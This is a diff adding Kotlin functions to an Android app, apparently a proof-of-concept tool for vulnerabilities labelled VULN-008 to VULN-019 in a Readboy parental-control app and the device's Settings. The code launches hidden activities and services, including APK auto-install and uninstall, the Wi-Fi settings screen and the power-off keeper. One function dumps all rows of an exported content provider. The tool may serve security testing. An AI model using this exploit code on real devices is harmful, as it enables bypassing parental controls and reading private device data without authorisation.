@@ -787,4 +787,159 @@ class MainViewModel : ViewModel() {
             }
         }
     }
+
+    // ============ 新增未实现组件功能 ============
+
+    // VULN-008: UploadRecordService - 上传记录服务
+    fun uploadRecord(context: Context) {
+        val intent = Intent().apply {
+            action = "com.readboy.parentmanager.ACTION_UPLOAD_RECORD"
+            setPackage("com.readboy.parentmanager")
+        }
+        try {
+            context.startService(intent)
+            Toast.makeText(context, "上传记录中...", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(context, "上传失败: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // VULN-009: AutoInstallUninstallApk - 自动安装卸载APK
+    fun openAutoInstallUninstallApk(context: Context) {
+        val intent = Intent().apply {
+            action = "android.intent.action.AutoInstallUninstallApk"
+            setPackage("com.android.settings")
+        }
+        try {
+            context.startActivity(intent)
+            Toast.makeText(context, "打开自动安装卸载页面", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(context, "打开失败: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // VULN-010: SettingsPreinstallDialogActivity - 预安装对话框
+    fun openPreinstallDialog(context: Context) {
+        val intent = Intent().apply {
+            action = "android.settings.action_settingspreinstalldialogactivity"
+            setPackage("com.android.settings")
+        }
+        try {
+            context.startActivity(intent)
+            Toast.makeText(context, "打开预安装对话框", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(context, "打开失败: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // VULN-012: PowerOffKeeperService - 电源保持服务
+    fun enablePowerOffKeeper(context: Context) {
+        val intent = Intent().apply {
+            action = "com.android.settings.delaytime_poweroffkeeper_service"
+            setPackage("com.android.settings")
+            putExtra("enable", true)
+        }
+        try {
+            context.startService(intent)
+            Toast.makeText(context, "电源保持已启用", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(context, "操作失败: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    fun disablePowerOffKeeper(context: Context) {
+        val intent = Intent().apply {
+            action = "com.android.settings.delaytime_poweroffkeeper_service"
+            setPackage("com.android.settings")
+            putExtra("enable", false)
+        }
+        try {
+            context.startService(intent)
+            Toast.makeText(context, "电源保持已禁用", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(context, "操作失败: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // VULN-013: SettingsSharedContentProvider - 共享数据提供者
+    fun querySharedData(context: Context) {
+        viewModelScope.launch {
+            try {
+                val data = withContext(Dispatchers.IO) {
+                    val uri = android.net.Uri.parse("content://com.android.settings_rby_shared_data")
+                    val cursor: Cursor? = context.contentResolver.query(uri, null, null, null, null)
+                    val result = StringBuilder()
+                    cursor?.use {
+                        val columns = it.columnNames
+                        result.append("列: ${columns.joinToString(", ")}\n\n")
+                        while (it.moveToNext()) {
+                            for (col in columns) {
+                                val idx = it.getColumnIndex(col)
+                                result.append("$col: ${it.getString(idx)}\n")
+                            }
+                            result.append("\n")
+                        }
+                    }
+                    result.toString()
+                }
+                _appData.value = data.ifEmpty { "暂无数据" }
+            } catch (e: Exception) {
+                _appData.value = "查询失败: ${e.message}"
+            }
+        }
+    }
+
+    // VULN-017: WifiSettingActivity - WiFi设置
+    fun openWifiSetting(context: Context) {
+        val intent = Intent().apply {
+            setClassName("com.readboy.parentmanager", "com.readboy.parentmanager.base.activity.WifiSettingActivity")
+        }
+        try {
+            context.startActivity(intent)
+            Toast.makeText(context, "打开WiFi设置", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(context, "打开失败: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // VULN-018: NsfwAppUninstallTipsActivity - NSFW应用卸载提示
+    fun openNsfwUninstallTips(context: Context) {
+        val intent = Intent().apply {
+            setClassName("com.readboy.parentmanager", "com.readboy.parentmanager.base.activity.NsfwAppUninstallTipsActivity")
+        }
+        try {
+            context.startActivity(intent)
+            Toast.makeText(context, "打开NSFW卸载提示", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(context, "打开失败: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // VULN-019: ConfirmDeviceCredentialActivity - 设备凭据确认
+    fun openConfirmCredential(context: Context) {
+        val intent = Intent().apply {
+            action = "android.app.action.CONFIRM_DEVICE_CREDENTIAL"
+            setPackage("com.android.settings")
+        }
+        try {
+            context.startActivity(intent)
+            Toast.makeText(context, "打开设备凭据确认", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(context, "打开失败: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // HelpActivity - 帮助页面
+    fun openHelp(context: Context) {
+        val intent = Intent().apply {
+            action = "android.readboy.parentmanager.ACTION_HELP"
+            setPackage("com.readboy.parentmanager")
+        }
+        try {
+            context.startActivity(intent)
+            Toast.makeText(context, "打开帮助页面", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(context, "打开失败: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
 }
